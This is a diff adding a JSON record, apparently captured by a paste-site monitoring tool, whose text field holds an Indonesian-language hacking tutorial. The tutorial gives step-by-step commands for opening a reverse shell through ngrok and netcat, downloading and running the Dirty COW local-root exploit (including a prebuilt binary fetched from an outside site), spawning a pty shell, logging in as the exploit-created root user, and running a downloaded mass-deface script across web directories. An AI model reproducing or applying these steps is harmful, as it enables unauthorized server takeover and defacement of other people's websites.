@@ -1,0 +1,18 @@
+{
+ "espireDate": "N",
+ "format": "text",
+ "jSonReasons": [
+  "kw_password",
+  "kw_security",
+  "kw_deface",
+  "kw_target",
+  "lg_id",
+  "re_url"
+ ],
+ "key": "J7DNiJiw",
+ "pasteDate": "Feb 20, 2018, 1:50:25 PM",
+ "relevancy": 1.0,
+ "relevant": false,
+ "text": "Tutorial Back Connect \n1.bukak cmd \n2. ke dir ngrok \n3. ketikkan: ngrok.exe tcp 123 \n4. bukak cmd lagi ketikkan: nc -lnvp 123\n5. ke shell isikan server nya \n0.tcp.ngrok.io portnya random number di ngrok \n \nROOTING SERVER JIKA SEMUANYA NORMAL\n1.wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c \n2.gcc -pthread dirty.c -o dirty -lcrypt\n3.chmod +x dirty\n4. ./dirty \n5. masukin paswod baru \n6. tunggu\n\nCARA LAIN JIKA GCC NYA GK BISA \n1.wget https://con7ext-security.com/localroot/dirty \n2. chmod +x dirty\n3. ./dirty\n4. masukin password baru\n5. tunggu\n\n\nSETELAH KE ROOT\n1.python -c 'import pty; pty.spawn(\"/bin/sh\")'\n2. setelah itu login dengan ssh firefart@localhost trus masukkan password \n3.klo acces denied brati kurang ganteng :3 canda ketikkan su firefart trus masukan password \n4.Done berhasil rooting\n\nAPABILA pas ssh firefart@localhost nya connection refused\n1.ketikkan cd /etc/ssh/\n2.trus ketik ls cari file sshd_config\n3.klo ada ketikkan cat sshd_config\n4.cari portnya\n5.trus login dengan ssh firefart@localhost -p porttadi\n\nTUTORIAL MASS DEFACE\n1.upload kan sc mass defacenya di : www.mediafire.com/file/t7fj9t7575ufs5o/mass.zip \n2.ketikkan unzip mass.zip\n3.chmod +x mass\n4../mass\n5.\"Your Index Path To the server\" nanti kan ada bacaan gitu :3 taru sc mu misalkan home/meki/public_html/ccd.php\nato /vhost/target.com/ccd.php liat aja di dir shellnya :3\n6.baru \"enter the path to mass deface\" nah masukkan\nklo dirnya /home/user/public_html/ ketikkan /home/ saja trus enter\nklo dirnya /var/www/vhost/ ketikkan /var/www/vhost/ trus enter\nabis itu tunggu :3",
+ "title": "root"
+}
